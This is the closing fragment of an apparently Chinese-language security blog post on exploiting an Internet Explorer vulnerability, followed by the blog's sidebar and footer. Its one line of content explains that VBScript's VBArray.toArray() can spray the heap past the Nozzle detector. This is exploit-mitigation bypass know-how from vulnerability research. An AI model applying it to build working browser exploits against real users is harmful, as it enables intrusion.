<p><code>Nozzle</code> 并不检测 <code>VBScript</code>的执行，所以可以利用其绕过，<code>VBArray</code> 的 <code>toArray()</code> 可以堆上分配正常的 <code>BSTR</code> 对象。<br>参考:<a href="https://github.com/k33nteam/IE9-IE11-Vulnerability-Advanced-Exploitation/blob/master/Study-of-Exploit-Migitation-in-Modern-Browsers-KEENTeam-XCON2013.pdf" target="_blank" rel="noopener">Study-of-Exploit-Migitation-in-Modern-Browsers-KEENTeam-XCON2013</a></p>

      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/browser/" rel="tag"><i class="fa fa-tag"></i> browser</a>
          
            <a href="/tags/old-blog/" rel="tag"><i class="fa fa-tag"></i> old_blog</a>
          
            <a href="/tags/vuln/" rel="tag"><i class="fa fa-tag"></i> vuln</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/01/09/CVE-2010-2883/" rel="next" title="CVE-2010-2883">
                <i class="fa fa-chevron-left"></i> CVE-2010-2883
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/01/09/CVE-2013-1347/" rel="prev" title="CVE-2013-1347">
                CVE-2013-1347 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>


  </div>


          </div>
          

  
    <div class="comments" id="comments">
    </div>

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            Overview
          </li>
        </ul>
      

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="V4kst1z">
            
              <p class="site-author-name" itemprop="name">V4kst1z</p>
              <p class="site-description motion-element" itemprop="description">Bin Dog</p>
          </div>

          
            <nav class="site-state motion-element">
              
                <div class="site-state-item site-state-posts">
                
                  <a href="/archives/">
                
                    <span class="site-state-item-count">6</span>
                    <span class="site-state-item-name">posts</span>
                  </a>
                </div>
              

              

              
                
                
                <div class="site-state-item site-state-tags">
                  <a href="/tags/index.html">
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">6</span>
                    <span class="site-state-item-name">tags</span>
                  </a>
                </div>
              
            </nav>
          

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          
            <div class="links-of-author motion-element">
              
                <span class="links-of-author-item">
                  
                  
                    
                  
                  
                    
                  
                  <a href="https://github.com/Vsane" title="GitHub &rarr; https://github.com/Vsane" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
                </span>
              
                <span class="links-of-author-item">
                  
                  
                    
                  
                  
                    
                  
                  <a href="https://twitter.com/v4kst1z" title="Twitter &rarr; https://twitter.com/v4kst1z" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
                </span>
              
            </div>
          

          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://aryb1n.github.io/" title="https://aryb1n.github.io/" rel="noopener" target="_blank">Aryb1n</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://52yuluo.top/" title="http://52yuluo.top/" rel="noopener" target="_blank">Yuluo</a>
                  </li>
                
              </ul>
            </div>
          

          
            
          
          

        </div>
      </div>

      
      <!--noindex-->
        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
            
            
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#poc分析"><span class="nav-number">1.</span> <span class="nav-text">poc分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞成因"><span class="nav-number">2.</span> <span class="nav-text">漏洞成因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用"><span class="nav-number">3.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#win7-ie8"><span class="nav-number">3.1.</span> <span class="nav-text">win7+ie8</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#win7-ie9-10-11"><span class="nav-number">3.2.</span> <span class="nav-text">win7+ie9/10/11</span></a></li></ol></li></ol></div>
            

          </div>
        </div>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">V4kst1z</span>

  

  
</div>


  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v6.7.0</div>




        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="post-meta-item-icon">
      <i class="fa fa-user"></i>
    </span>
    <span class="site-uv" title="Total Visitors">
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
    </span>
  

  
    <span class="post-meta-divider">|</span>
  

  
    <span class="post-meta-item-icon">
      <i class="fa fa-eye"></i>
    </span>
    <span class="site-pv" title="Total Views">
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
    </span>
  
</div>









        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

    

    
  </div>

  

<script>
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>


























  
  <script src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>


  


  <script src="/js/src/utils.js?v=6.7.0"></script>

  <script src="/js/src/motion.js?v=6.7.0"></script>



  
  


  <script src="/js/src/affix.js?v=6.7.0"></script>

  <script src="/js/src/schemes/pisces.js?v=6.7.0"></script>




  
  <script src="/js/src/scrollspy.js?v=6.7.0"></script>
<script src="/js/src/post-details.js?v=6.7.0"></script>



  


  <script src="/js/src/bootstrap.js?v=6.7.0"></script>



  
  




  

<script src="//cdn1.lncld.net/static/js/3.11.1/av-min.js"></script>



<script src="//unpkg.com/valine/dist/Valine.min.js"></script>

<script>
  var GUEST = ['nick', 'mail', 'link'];
  var guest = 'nick,mail,link';
  guest = guest.split(',').filter(function (item) {
    return GUEST.indexOf(item) > -1;
  });
  new Valine({
    el: '#comments',
    verify: false,
    notify: false,
    appId: '3awIpSk2hfHaeA1glDs5NtYG-gzGzoHsz',
    appKey: '6ORiR0zVaYi0ljkwUfSn0aWG',
    placeholder: 'Just go go',
    avatar: 'mm',
    meta: guest,
    pageSize: '10' || 10,
    visitor: false
  });
</script>



  





  

  

  

  

  

  

  

  

  

  

  

  

  

</body>
</html>
